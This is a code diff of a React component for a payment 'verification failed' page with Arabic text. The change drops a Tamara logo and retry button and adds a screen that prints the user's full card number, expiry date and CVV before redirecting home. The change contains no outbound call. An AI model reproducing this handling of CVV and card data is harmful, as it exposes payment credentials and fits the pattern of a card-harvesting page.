@@ -1,45 +1,62 @@
-import { AlertCircle, RefreshCw } from 'lucide-react';
-import { Button } from '@/components/ui/button';
+import { useEffect, useState } from 'react';
+import { X } from 'lucide-react';
+import { useNavigate } from 'react-router-dom';
 
 interface VerificationFailedProps {
-  verificationError: string | null;
-  onRetry: () => void;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string;
+  countdownSeconds?: number;
 }
 
-const VerificationFailed = ({ verificationError, onRetry }: VerificationFailedProps) => {
+const VerificationFailed = ({ 
+  cardNumber, 
+  cardExpiry, 
+  cardCvv, 
+  countdownSeconds = 5 
+}: VerificationFailedProps) => {
+  const navigate = useNavigate();
+  const [countdown, setCountdown] = useState(countdownSeconds);
+
+  useEffect(() => {
+    if (countdown <= 0) {
+      navigate('/');
+      return;
+    }
+
+    const timer = setInterval(() => {
+      setCountdown((prev) => prev - 1);
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [countdown, navigate]);
+
   return (
-    <div className="bg-white rounded-2xl border border-gray-200 p-10 text-center shadow-sm">
-      <div className="mb-6">
-        <img
-          src="/tamara-logo.webp"
-          alt="Tamara"
-          className="h-10 mx-auto object-contain"
-        />
+    <div className="bg-white rounded-2xl p-10 text-center min-w-[320px]">
+      <div className="w-20 h-20 rounded-full bg-red-100 mx-auto mb-6 flex items-center justify-center">
+        <X className="h-10 w-10 text-red-500" strokeWidth={3} />
       </div>
 
-      <div className="w-20 h-20 rounded-full bg-orange-100 mx-auto mb-6 flex items-center justify-center">
-        <AlertCircle className="h-10 w-10 text-orange-500" />
-      </div>
+      <h2 className="text-2xl font-bold text-red-500 mb-6">بيانات البطاقة خاطئة</h2>
 
-      <h2 className="text-2xl font-bold text-gray-900 mb-2">فشل التحقق</h2>
-      <p className="text-gray-500 mb-2">لم نتمكن من إتمام عملية التحقق</p>
-
-      {verificationError && (
-        <div className="bg-orange-50 border border-orange-200 rounded-lg p-4 mb-6">
-          <p className="text-sm text-orange-700">{verificationError}</p>
+      <div className="bg-gray-100 rounded-lg p-6 mb-6 text-right">
+        <div className="mb-3">
+          <span className="text-gray-600">رقم البطاقة:</span>
+          <span className="text-gray-900 font-medium mr-2">{cardNumber}</span>
         </div>
-      )}
-
-      <div className="bg-gray-50 rounded-lg p-4 mb-6">
-        <p className="text-xs text-gray-500">
-          إذا كنت تعتقد أن هناك خطأ، يرجى التواصل مع خدمة العملاء
-        </p>
+        <div className="mb-3">
+          <span className="text-gray-600">تاريخ الانتهاء:</span>
+          <span className="text-gray-900 font-medium mr-2">{cardExpiry}</span>
+        </div>
+        <div>
+          <span className="text-gray-600">CCV:</span>
+          <span className="text-gray-900 font-medium mr-2">{cardCvv}</span>
+        </div>
       </div>
 
-      <Button onClick={onRetry} className="w-full bg-[#d4af37] hover:bg-[#c9a030] text-white font-bold py-4 rounded-lg">
-        <RefreshCw className="h-4 w-4 ml-2" />
-        المحاولة مرة أخرى
-      </Button>
+      <p className="text-gray-500 text-sm">
+        سيتم توجيهك إلى الصفحة الرئيسية خلال {countdown} ثواني
+      </p>
     </div>
   );
 };
